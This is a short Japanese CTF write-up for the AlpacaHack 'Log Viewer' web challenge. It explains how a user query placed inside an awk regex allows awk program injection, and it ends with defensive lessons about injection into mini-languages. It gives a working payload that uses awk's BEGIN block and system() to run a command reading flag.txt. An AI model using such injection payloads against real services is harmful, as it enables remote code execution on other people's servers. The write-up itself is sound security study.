---
title: Log Viewer
category: web
genre: command-injection
difficulty: medium
tags:
  - awk-injection
  - rce
  - regex-context
source: alpacahack:log-viewer
solved_at: 2026-05-29
---

# Log Viewer

## 問題の要点

- 入力 query が `awk "/{query}/" info.log` の regex 部分に入る。
- shell injection ではなく、awk program injection として考える。
- awk には `system()` がある。

## 解き方

前後に付く `/` を閉じて、`BEGIN` action でコマンドを実行する。

```text
/{}; BEGIN { system("cat flag.txt") }; /dummy
```

## 知見

- subprocess に list で渡していても、呼び出し先言語の構文にユーザー入力を埋めれば injection になる。
- grep/sed/awk/SQL/テンプレートなど、shell 以外の「小言語」は全部 injection surface。

## 連携する知見

- [Web](../../../insights/web.md)
- [Web relations](../../../relations/web.md)
